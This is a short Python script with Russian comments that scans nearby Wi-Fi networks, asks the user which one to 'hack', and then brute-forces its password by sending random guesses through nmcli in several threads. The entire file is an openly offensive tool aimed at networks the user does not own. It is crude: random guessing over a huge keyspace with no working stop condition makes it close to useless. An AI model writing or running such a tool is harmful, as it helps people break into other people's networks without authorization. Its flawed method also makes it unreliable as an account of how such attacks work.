import subprocess
import re
import random
import string
import threading

def get_wifi_networks():
    # Запускаем команду для сканирования доступных Wi-Fi сетей
    result = subprocess.run(['iwlist', 'scan'], capture_output=True, text=True)
    output = result.stdout
    
    # Используем регулярные выражения для извлечения SSID сетей
    networks = re.findall(r'ESSID:"([^"]+)"', output)
    
    return networks

def generate_random_password(length=8):
    # Генерируем случайный пароль заданной длины
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

def try_password(ssid, password):
    # Пытаемся подключиться к Wi-Fi сети с использованием сгенерированного пароля
    result = subprocess.run(['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password], capture_output=True, text=True)
    output = result.stdout
    
    # Если подключение успешно, возвращаем пароль
    if "successfully activated" in output:
        return password
    else:
        return None

def crack_wifi_password(ssid, num_threads=4):
    passwords = set()
    threads = []
    
    def worker():
        while True:
            password = generate_random_password()
            if password in passwords:
                continue
            passwords.add(password)
            result = try_password(ssid, password)
            if result:
                print(f"Пароль найден: {result}")
                return result
    
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def main():
    networks = get_wifi_networks()
    print("Доступные Wi-Fi сети:")
    for i, network in enumerate(networks):
        print(f"{i + 1}. {network}")
    
    choice = int(input("Выберите сеть для взлома (номер): ")) - 1
    ssid = networks[choice]
    
    print(f"Начинаем взлом сети {ssid}...")
    crack_wifi_password(ssid)

if __name__ == "__main__":
    main()
